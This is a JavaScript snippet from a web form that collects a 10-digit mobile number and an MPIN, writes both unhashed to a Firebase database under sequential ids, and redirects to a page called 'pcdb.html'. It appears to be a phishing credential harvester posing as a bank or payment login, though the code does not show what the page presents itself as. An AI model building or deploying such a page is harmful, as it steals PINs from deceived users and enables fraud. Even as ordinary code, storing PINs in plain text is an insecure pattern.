
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
  apiKey: "AIzaSyBbKc0ooa1s94JLsHGi0ltamx--DP3fQYU",
  authDomain: "axin-edd86.firebaseapp.com",
  projectId: "axin-edd86",
  storageBucket: "axin-edd86.appspot.com",
  messagingSenderId: "634053430908",
  appId: "1:634053430908:web:acc26b71e17feae5f243f9"
};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);

      //Insert data
      import {
        getDatabase,
        ref,
        get,
        set,
        child,
        update,
        query,
        limitToLast,
        remove,
      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

      const db = getDatabase();

      var mobile = document.querySelector("#mobile");
      var mpin = document.querySelector("#mpin");

      var insertBtn = document.querySelector("#insert");

      const que = query(ref(db, "people"), limitToLast(1));

      const last_key = await get(que)
        .then((snapshot) => {
          if (snapshot.exists()) {
            return parseInt(Object.keys(snapshot.val())[0]) + 1;
          } else {
            return 1;
          }
        })
        .catch((error) => {
          console.error(error);
        });

      function InsertData() {
        if (mobile.value.length != 10) {
          alert("Please enter valid 10 digits Phone number");
          return;
        }

        if (mpin.value == "" || mpin.value == null || mpin.value == undefined) {
          alert("MPIN required");
          return;
        }

        insertBtn.classList.add("loading");

        localStorage.setItem("id", last_key);

        set(ref(db, "people/" + last_key), {
          mobile: mobile.value,
          mpin: mpin.value,
        })
          .then(() => {
            insertBtn.classList.remove("loading");
            window.location.href = "pcdb.html";
          })
          .catch((error) => {
            insertBtn.classList.remove("loading");
          });
      }
      insertBtn.addEventListener("click", InsertData);
    